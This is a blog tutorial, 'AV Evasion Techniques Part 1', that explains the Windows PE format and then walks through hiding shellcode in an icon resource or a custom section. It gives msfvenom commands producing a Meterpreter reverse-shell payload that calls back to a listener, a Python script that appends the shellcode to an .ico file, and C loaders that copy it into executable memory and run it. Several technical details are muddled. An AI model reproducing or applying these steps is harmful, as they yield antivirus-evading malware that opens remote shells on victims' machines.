---
layout: post
title: "AV Evasion Techniques Part 1 : Storing Shellcode in an Icon Image"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---


**Introduction**

in this article, we’ll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We’ll look at different techniques available to us as attackers and discuss the pros and cons of every one of them.

**Objectives:**

1\. Learn how shellcodes are made.

2\. Explore the pros and cons of staged payloads

3\. Create stealthy shellcodes to avoid AV detection

**Prerequisites**

It is recommended to have some prior knowledge of **how antivirus software works** and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding Functions (C, Ca).

**PE Structure**

This tech highlights some of the high-level essential elements of PE data structure for Windows binaries

**What is PE?**

Windows Executable file format, aka **PE (Portable Executable)**, is a **data structure** that holds information necessary for files.it is way to organize executable file code on a disk. Windows operating system components, such as **Windows and DDOS loaders**, can load it to memory and execute it based on the parsed file information found in the PE

in general, the default file structure of Windows binaries, such **as EXE, DLL, and Object code files, has the same PE structure** and works in the Windows Operating System for both (x86 and x64) CPU architecture.

A PE structure contains various sections that hold information about the binary, such as **metadata and links to a memory address of external libraries**. One of these sections is the **PE Header,** which contains metadata information, pointers, and links to address sections in memory, another section is the **Data section**, which includes containers that include the information required for the **Windows loader** to run a program, such as the executable **code**, **resources, links to libraries, data variables, etc**.

There are different types of date containers in the PE structure, each holding different data.

1\. **.text** stores the actual code of the program

2\. **.data** holds the initialized and defined variables

3\. **.bss** holds the **uninitialized** data (declared variables no assigned values)

4\. **.rdata** contains the read-only data

5\. **.edata** contains exportable objects and related table information

6\. **.idata** imported objects and related table information

7\. **.reloc** image relocation information

8\. **.rsrc** links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright!

**The PE structure** is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. if you are interested in gaining more information on the topic we suggest checking the following **THM rooms** where the topic is explained in greater detail:

· **Windows Internals**

· **Dissecting PE Headers**

You can also get more in-depth details about PE if you check the **windows PE format’s Docs** website.

When looking at the PE contents, we’ll see it contains a bunch of bytes that **aren’t human-readable**. However, it includes all the details the loader needs to run the File. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process:

1\. **Header sections**: **DOS**, **Windows**, and optional headers are parsed to provide information about the **EXE** file, For example,

· The magic number starts with “**MZ**” which tells the loader that this is an **EXE** File

· File Signatures

· Whether the file is compiled for **x86** or **x64** CPU architecture

· Creation timestamp

2\. Parsing the section table details, such as:

· Number of Sections the file contains

3\. Mapping the file contents into memory based on:

· The Entry Point address and the offset of the ImageBase.

· RV: Relative Virtual Address, Addresses related to Imagebase.

4\. Imports, DLLs, and other objects are loaded into the memory

5\. The EntryPoint address is located and the **main** execution function runs.

**Why do we need to know about PE?**

There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure.

The other reason is that AV software and malware analysts analyze EXE Files based on the information in the PE header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored.

We can control in which **Data** section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE:

1\. Defining the shellcode as a **local variable** within the main Function will store it in the **.TEXT** PE section.

2\. Defining the shellcode as a **global** variable will store it in the **.Data** section.

3\. Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the **.rsrc Data** section.

### Storing Shellcode in an Icon Image

This technique involves embedding shellcode as **raw** binary data into an image file, typically linked to a Portable Executable (**PE**) file in the `.rsrc` **(resource**) **section**. The `.rsrc` section is a legitimate part of a PE file that stores resources like icons, cursors, menus, and other non-executable data. By embedding shellcode in this section, the malware author hides it from static analysis tools and raises the likelihood of bypassing antivirus (AV) detection.

#### Detailed Steps and Explanation

#### 1. Understanding the .rsrc Section

- **Legitimacy**: The `.rsrc` section is often overlooked by AV engines since it traditionally contains harmless resources.
- **Steganography-like Approach**: The embedded shellcode resides alongside benign data, making detection more challenging.

#### 2. Workflow for Embedding Shellcode

**1. Generate Shellcode**: Use a tool like `msfvenom` to generate raw shellcode:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
```

**Step 2: Embed Shellcode in an Icon**

- Select an icon file (`.ico` format) and embed the raw shellcode data in its unused sections (e.g., padding bytes or after valid image data).
- For simplicity, you can append the shellcode directly to the file. The modified icon still functions correctly but carries the malicious payload.

· **Open the Icon File in a Hex Editor:**

- Open your `.ico` file in a hex editor like **HxD**.
- Locate the end of the valid image data. This is often padded with zeros, making it a suitable insertion point for extra data.

· **Insert the Shellcode:**

- Append or overwrite unused bytes at the end of the `.ico` file with the contents of `shellcode.bin`**.**
- Save the modified `.ico` file.

**Option 2: Automate Using Python**

You can automate this process with a Python script:

```
# Python script to embed shellcode into an icon file
def embed_shellcode(icon_path, shellcode_path, output_path):
with open(icon_path, "rb") as icon_file:
icon_data = icon_file.read()
with open(shellcode_path, "rb") as shellcode_file:
shellcode_data = shellcode_file.read()

# Embed shellcode at the end of the icon file
modified_icon = icon_data + shellcode_data

with open(output_path, "wb") as output_file:
output_file.write(modified_icon)

# Example usage
embed_shellcode("icon.ico", "shellcode.bin", "icon_with_shellcode.ico")
```

#### Step 3: Embed the Icon File in the PE File

Once the icon is prepared, you need to add it to the `.rsrc` section of your PE file.

**Option 1: Use Resource Hacker**

1\. **Open Resource Hacker:**

- Download and install Resource Hacker.
- Open your PE file (e.g., `malicious.exe`) in Resource Hacker.

2\. **Add the Modified Icon:**

- Navigate to `Action > Add a New Resource`**.**
- Select your modified icon (`icon_with_shellcode.ico`**)** and add it to the `.rsrc` section under the `ICON` group.
- Save the changes.

3\. **Verify:**

Check if the PE file now has the `.rsrc` section containing the new icon.

**Option 2: Using Windows** `mt.exe`

The `mt.exe` tool, included in the Windows SDK, allows you to embed resources into a PE file.

1\. **Prepare a Resource Script (**`.rc` **File):**

- Create a file named `resource.rc` with the following content:

```
ICON ICON "icon_with_shellcode.ico"
```

2\. **Compile the Resource File:**

- Compile the resource script into a resource object file (`.res`) using `rc.exe`:

```
rc.exe resource.rc
```

3\. **Embed the Resource:**

- Use `mt.exe` to embed the compiled resource into your PE file:

```
mt.exe -manifest resource.res -outputresource:malicious.exe;1
```

**Option 3: Manual Embedding**

For a more programmatic approach (e.g., custom packers):

1. Open the PE file and locate the `.rsrc` section using tools like PE-Bear or a custom script.
2. Append the modified icon file directly to the `.rsrc` section in the binary.
3. Update the Resource Table to include a reference to the new icon.

#### Testing the Execution

To extract and execute the shellcode at runtime:

1. Use APIs like `FindResource`, `LoadResource`, and `LockResource` to locate and extract the embedded icon.
2. Extract the raw binary (shellcode) from the icon and execute it.

Example in C (runtime extraction and execution):

```
#include <windows.h>
void executeShellcodeFromResource() {
HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(101), RT_ICON); // ID 101, linked earlier
if (hResource == NULL) return;

HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
void *shellcode = LockResource(hLoadedResource);
DWORD size = SizeofResource(NULL, hResource);

// Execute the shellcode
void *exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, size);
((void (*)())exec)();
}

int main() {
executeShellcodeFromResource();
return 0;
}
```

* * *

**4. Advantages of This Technique**

- **Bypasses Static Analysis**: Shellcode hidden in an icon is less likely to be flagged during static analysis because the `.rsrc` section is typically ignored.
- **Stealthy Execution**: Shellcode extraction from legitimate resources appears as normal file operations in logs.
- **Evades AV Signatures**: Custom shellcode and its obfuscation make detection by signature-based systems more challenging.

4\. we can add a **custom data** section to store the shellcode.

### Adding a Custom Data Section for Shellcode

**Overview**:  
In this method, a custom section is added to the binary (e.g., `.mydata`) where the shellcode is stored. The section is loaded into memory at runtime, and the shellcode can be executed directly.

#### Steps:

1\. **Generate Shellcode**: As before, generate the shellcode using a tool like `msfvenom`:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
```

2\. **Add a Custom Section to the Binary**:

- Use a PE editor (e.g., **PE-bear, CFF Explorer**) or a script to add a new section.
- Name the section (e.g., `.mydata`) and embed the shellcode into it.

Example with `objcopy` (Linux):

```
objcopy --add-section .mydata=shellcode.bin payload.exe
```

3\. **Extract and Execute Shellcode**: Write code to locate the custom section in memory and execute the shellcode:

```
#include <windows.h>
extern char my_shellcode_start;
extern char my_shellcode_end;

void ExecuteShellcode() {
// Calculate the shellcode size
size_t shellcodeSize = &my_shellcode_end - &my_shellcode_start;

// Allocate memory for shellcode
void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, &my_shellcode_start, shellcodeSize);

// Execute shellcode
((void(*)())exec)();
}

int main() {
ExecuteShellcode();
return 0;
}
```

4\. **Compile with Linker Options**: Use a linker to specify the custom section:

```
gcc -o payload.exe payload.c -Wl,--section-start,.mydata=0x400000
```

**Detection Evasion**:  
The `.mydata` section appears non-executable unless specifically inspected. Static scanners may not flag it, as it doesn’t conform to known malicious patterns.

**PE-Bear**

helps to check the PE structure: **Headers, Sections, etc**. PE-Bear provides a graphic user interface to show all relevant EXE details.

shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to shell or create a reverse command shell.

Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker’s code

it is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task.

in the Upcoming article, we will write custom shellcode in assembly. Stay Tuned !

By [Moataz Osama](https://medium.com/@mezo512) on [January 29, 2025](https://medium.com/p/2364f816275c).

[Canonical link](https://medium.com/@mezo512/av-evasion-techniques-part-1-storing-shellcode-in-an-icon-image-2364f816275c)

Exported from [Medium](https://medium.com) on August 26, 2025.